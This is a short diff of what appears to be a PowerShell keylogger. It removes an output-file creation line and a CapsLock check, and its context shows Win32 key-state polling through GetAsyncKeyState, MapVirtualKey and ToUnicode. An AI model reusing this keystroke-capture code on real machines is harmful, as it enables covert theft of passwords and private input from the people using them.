@@ -14,8 +14,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-$null = New-Item -Path $Path -ItemType File -Force
-
 try{
     $str1 = ""
     $count = 0
@@ -45,7 +43,6 @@ try{
             $state = $API::GetAsyncKeyState($ascii)
 
             if ($state -eq -32767) {
-                $null = [console]::CapsLock
 
                 $virtualKey = $API::MapVirtualKey($ascii, 3)
 
